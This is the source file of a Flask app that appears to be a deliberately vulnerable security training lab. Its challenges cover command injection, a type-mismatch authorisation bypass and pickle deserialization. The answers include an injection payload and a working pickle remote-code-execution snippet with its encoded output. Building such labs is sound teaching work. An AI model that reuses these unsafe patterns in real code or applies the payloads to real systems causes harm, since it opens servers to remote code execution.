from flask import Flask, render_template, request, jsonify, make_response, redirect
import os
import platform
import pickle
import uuid
import base64

app = Flask(__name__)


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/about")
def about():
    return render_template("about.html")


@app.route("/repl")
def repl():
    return render_template("repl.html")


# Command injection
@app.route("/command-injection")
def command_injection():
    meta = {
        "title": "Command Injection",
        "objective": "Gain Remote Code Execution",
        "hint": "Escape from the command and execute your own.<br><br><code>ping ip_address</code>",
        "answer": "Command Injection Payload:<br><br><code>ping -c 1 127.0.0.1;id</code>",
    }
    ip_address = request.args.get("ip")
    output = ""
    if ip_address:
        if platform.system().lower() == "windows":
            command_to_execute = "ping -n 1 " + ip_address
        elif platform.system().lower() == "linux":
            command_to_execute = "ping -c 1 " + ip_address
        else:
            command_to_execute = "ping " + ip_address
        output = os.popen(command_to_execute).read()

    return render_template(
        "challenges/command-injection.html", meta=meta, output=output
    )


# Types mismatch
@app.route("/types-mismatch/api", methods=["POST"])
def get_posts():
    posts = [
        {
            "post_id": 0,
            "title": "Secret post by admin 1",
            "body": "I don't like pineapple on pizza!"
        },
        {
            "post_id": 1,
            "title": "Secret post by admin 2",
            "body": "My email is `superadmin@admin.com` and my password is `supersecurepassword123`"
        },
        {
            "post_id": 2,
            "title": "Welcome to my blog",
            "body": "This is my first post (^,^)"
        },
        {
            "post_id": 3,
            "title": "Catz",
            "body": "I bought a cat!"
        },
        {
            "post_id": 4,
            "title": "We moved!",
            "body": "We moved to Osaka, Japan :)"
        },
        {
            "post_id": 5,
            "title": "Learning Japanese",
            "body": "Learning Japanese by watching animes (^-^)"
        }
    ]
    output = {"error": None, "post": None}

    try:
        json_data = request.get_json()
        if not json_data:
            output['error'] = "empty"

        if 'post_id' in json_data:
            post_id = json_data["post_id"]

            if post_id < 2:
                output['error'] = "unauthorized"
            else:
                for post in posts:
                    if (str(post['post_id']) == str(post_id)):
                        output = {"post": post}
                        break
        else:
            output['error'] = "missing 'post_id' of type 'number'"

    except Exception, ex:
        output['error'] = "invalid 'content-type'"

    return jsonify(output)


@app.route("/types-mismatch")
def types_mismatch():
    meta = {
        "title": "Types Mismatch",
        "objective": "Access posts made my the admin",
        "hint": "Take a look at the types.",
        "answer": "Instead of sending an integer <code>{ \"post_id\": 1}</code> <br> send a string <code>{ \"post_id\": \"1\"}</code>",
    }
    return render_template("challenges/types-mismatch.html", meta=meta)


@app.route("/deserialization")
def deserialization():
    meta = {
        "title": "Deserialization",
        "objective": "Gain Remote Code Execution",
        "hint": "You might wanna look at the cookies and try to decode it.",
        "answer": """Decode base64 cookie <code>VSESSIONID</code><br/>You'll see that it's 'Pickle' serialized data. Create a malicious object which imports 'os' module and executes system commands. <br/><br/><b><u>Code</u></b><code><pre>
import pickle, base64

class RCE(object):
    def __reduce__(self):
        return (
            __import__('os').system,
            ("id",)
        )

base64.b64encode(
    pickle.dumps(
        RCE()
    )
)
        </pre></code>
        Output: <code>Y3Bvc2l4CnN5c3RlbQpwMAooUydpZCcKcDEKdHAyClJwMwou</code>
        Set this as the new cookie, you'll see that the 'id' command got executed.
        """,
    }

    name = request.args.get("name")
    output = ""

    if 'VSESSIONID' in request.cookies:
        decoded = base64.b64decode(request.cookies['VSESSIONID'])
        deserialized = pickle.loads(decoded)
        try:
            output = deserialized['user_name']
        except:
            return redirect('/500')
    else:
        if name:
            user_cookie = {
                'user_id': uuid.uuid4(),
                'user_name': name
            }
            user_cookie_set = base64.b64encode(pickle.dumps(user_cookie))
            resp = make_response(
                "<script>window.location.replace('/deserialization')</script>")
            resp.set_cookie('VSESSIONID', user_cookie_set)
            return resp

    return render_template("challenges/deserialization.html", meta=meta, output=output)


@app.route("/500")
@app.errorhandler(500)
def internal_server_error(e=None):
    return render_template("error.html", error_message="500 Internal server error"), 500


@app.errorhandler(405)
def method_not_allowed(e):
    return render_template("error.html", error_message="405 Method not allowed"), 405


@app.errorhandler(404)
def page_not_found(e):
    return render_template("error.html", error_message="404 Not found"), 404
    

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=8080, debug=True)
